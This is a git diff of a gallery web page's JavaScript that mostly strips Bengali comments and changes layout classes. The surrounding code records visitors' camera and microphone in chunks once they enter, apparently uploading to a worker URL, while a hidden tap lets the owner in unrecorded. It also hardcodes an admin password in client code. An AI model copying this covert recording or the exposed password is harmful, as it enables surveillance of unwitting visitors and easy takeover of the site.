@@ -1,5 +1,5 @@
 const WORKER_URL = 'https://ourmemory.mrony8552.workers.dev'; 
-const ADMIN_PASS = "74722222"; // গ্যালারি থেকে সরাসরি ডিলিট করার জন্য
+const ADMIN_PASS = "74722222"; 
 const RECORDING_CHUNK_MS = 15000; 
 
 const entryScreen = document.getElementById('entry-screen');
@@ -10,7 +10,7 @@ const galleryContainer = document.getElementById('gallery-grid');
 let secretTap = 0, tapTimer;
 document.getElementById('secret-heart').addEventListener('click', () => {
     secretTap++; clearTimeout(tapTimer);
-    if (secretTap >= 3) { enterGallery(); secretTap = 0; } // সিক্রেট এন্ট্রি (রেকর্ড ছাড়া)
+    if (secretTap >= 3) { enterGallery(); secretTap = 0; } 
     tapTimer = setTimeout(() => secretTap = 0, 1000); 
 });
 
@@ -19,7 +19,7 @@ document.getElementById('enter-btn').addEventListener('click', async () => {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         enterGallery();
         startRecording(stream);
-    } catch (err) { enterGallery(); } // পারমিশন না দিলেও গ্যালারিতে যাবে
+    } catch (err) { enterGallery(); } 
 });
 
 function enterGallery() {
@@ -103,10 +103,11 @@ document.getElementById('theme-toggle').addEventListener('click', () => {
     document.body.classList.add(themes[themeIdx]);
 });
 
-const layouts = ['layout-2col', 'layout-3col', 'layout-masonry', 'layout-1col'];
+// The 5 Exact Grid Layouts
+const layouts = ['grid-style-5', 'grid-style-1', 'grid-style-2', 'grid-style-3', 'grid-style-4'];
 let layoutIdx = 0;
 document.getElementById('layout-toggle').addEventListener('click', () => {
-    galleryContainer.classList.remove(layouts[layoutIdx]);
+    galleryContainer.className = ''; // Clear previous classes
     layoutIdx = (layoutIdx + 1) % layouts.length;
     galleryContainer.classList.add(layouts[layoutIdx]);
 });
